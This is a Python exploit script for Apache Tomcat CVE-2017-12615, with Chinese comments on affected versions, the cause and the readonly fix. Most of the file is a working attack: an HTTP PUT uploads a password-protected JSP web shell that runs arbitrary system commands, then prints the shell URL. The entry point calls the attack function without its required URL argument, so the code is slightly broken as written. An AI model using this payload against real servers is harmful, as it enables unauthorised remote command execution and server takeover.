# -*- coding: utf-8 -*-
import sys
import requests
import time

'''
Usage:
    moon.py -u  tomcat http://127.0.0.1:8080
    shell: http://127.0.0.1:8080/201712615.jsp?pwd=fff&cmd=whoami
    影响范围：Linux/Windows  Tomcat: 7.0.0 to 7.0.79 - 官网数据
    成因：Tomcat配置了可写（readonly=false），导致我们可以往服务器写文件
    最好的解决方式是将 conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 true
'''

def attack(URL):
    print('[+]开始检测-Tomcat-CVE-2017-12615。[+]')
    url = URL + '/T68t8YT86.jsp/'
    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
    headers={"User-Agent":user_agent}
    data="""<%
    if("fff".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>"""
    try:
        requests.put(url, headers=headers, data=data)
        time.sleep(2)
        verify_response = requests.get(url[:-1], headers=headers)
        if verify_response.status_code == 200:
            print('存在-Tomcat-CVE-2017-12615!!!')
            print('shell: ' + url[:-1]+'?pwd=fff&cmd=whoami')
        else :
            print('访问shell地址：'+verify_response.status_code)
            print("未发现-Tomcat-CVE-2017-12615。")
    except :
        print("未发现-Tomcat-CVE-2017-12615。")
    print('[+]检测结束-Tomcat-CVE-2017-12615。[+]')
    print('\n')

if __name__ == "__main__":
    attack()